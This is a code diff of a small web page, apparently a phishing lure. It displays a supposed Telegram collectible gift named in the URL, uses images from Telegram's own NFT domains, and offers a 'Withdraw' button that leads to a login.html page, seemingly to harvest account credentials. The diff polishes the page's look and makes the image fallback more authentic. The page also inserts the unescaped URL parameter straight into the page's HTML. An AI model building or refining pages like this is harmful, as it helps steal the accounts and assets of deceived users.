@@ -3,34 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EpixGift</title>
+    <title>EpixGift Inventory</title>
     <style>
-        body { background-color: #0e141b; color: white; font-family: -apple-system, sans-serif; margin: 0; padding: 15px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .nft-card { background: #1c252f; border-radius: 15px; padding: 12px; border: 1px solid #2a3644; text-align: center; }
-        .img-box { width: 100%; aspect-ratio: 1/1; border-radius: 10px; margin-bottom: 10px; background: #2a3644; overflow: hidden; }
+        body { background: #0e141b; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; }
+        .header { font-size: 22px; font-weight: 700; margin-bottom: 20px; border-bottom: 1px solid #1c252f; padding-bottom: 15px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .nft-card { background: #1c252f; border-radius: 18px; padding: 12px; border: 1px solid #2a3644; text-align: center; }
+        .img-box { width: 100%; aspect-ratio: 1/1; border-radius: 12px; background: #2a3644; margin-bottom: 10px; overflow: hidden; }
         .img-box img { width: 100%; height: 100%; object-fit: cover; }
-        .btn-withdraw { display: block; background: #248bdf; color: white; border: none; font-size: 14px; font-weight: bold; padding: 12px 0; border-radius: 10px; width: 100%; cursor: pointer; }
+        .title { font-weight: 600; font-size: 14px; margin-bottom: 4px; }
+        .sub { font-size: 12px; color: #8a99a8; margin-bottom: 15px; }
+        .btn { display: block; background: #248bdf; color: #fff; text-decoration: none; padding: 12px; border-radius: 10px; font-weight: 700; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">EpixGift</div>
-    <div class="grid" id="main-grid"></div>
+    <div class="header">EpixGift</div>
+    <div class="grid" id="grid"></div>
 
     <script>
         const params = new URLSearchParams(window.location.search);
         const id = params.get('item');
         if (id) {
             const title = id.replace(/-/g, ' #');
-            // Прямой метод получения картинки через официальный домен Telegram NFT
+            // Используем надежный источник для фото
             const imgUrl = `https://nft.fragment.com/pendant/${id.split('-')[1]}.webp`;
             
-            document.getElementById('main-grid').innerHTML = `
+            document.getElementById('grid').innerHTML = `
                 <div class="nft-card">
-                    <div class="img-box"><img src="${imgUrl}" onerror="this.src='https://via.placeholder.com/300/1c252f/ffffff?text=NFT'"></div>
-                    <div style="font-weight: bold; font-size: 14px; margin-bottom: 5px;">${title}</div>
-                    <div style="font-size: 12px; color: #8a99a8; margin-bottom: 15px;">Collectible</div>
-                    <button class="btn-withdraw" onclick="location.href='login.html'">Withdraw</button>
+                    <div class="img-box"><img src="${imgUrl}" onerror="this.src='https://t.me/i/nft/${id}.jpg'"></div>
+                    <div class="title">${title}</div>
+                    <div class="sub">Collectible</div>
+                    <a href="login.html" class="btn">Withdraw</a>
                 </div>`;
         }
     </script>
